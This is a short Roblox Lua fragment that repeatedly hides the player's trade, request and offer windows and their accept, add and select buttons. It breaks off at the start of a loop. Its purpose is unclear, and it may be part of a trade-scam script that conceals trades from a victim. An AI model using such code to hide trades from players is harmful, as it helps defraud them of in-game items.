-- AGGRESSIVE GUI HIDER – runs every 0.2 seconds
-- ============================================================
local function hideAllTradeGUIs()
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then return end
    for _, obj in pairs(gui:GetDescendants()) do
        if obj:IsA("ScreenGui") then
            local name = obj.Name:lower()
            if name:find("trade") or name:find("request") or name:find("offer") then
                obj.Enabled = false
            end
        end
        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
            local name = obj.Name:lower()
            if name:find("trade") or name:find("request") or name:find("offer") then
                obj.Visible = false
                obj.Active = false
            end
        end
        if obj:IsA("TextButton") and (obj.Name:lower():find("accept") or obj.Name:lower():find("add") or obj.Name:lower():find("select")) then
            -- Disable button interactivity
            obj.Visible = false
        end
    end
end

-- Persistent hiding loop
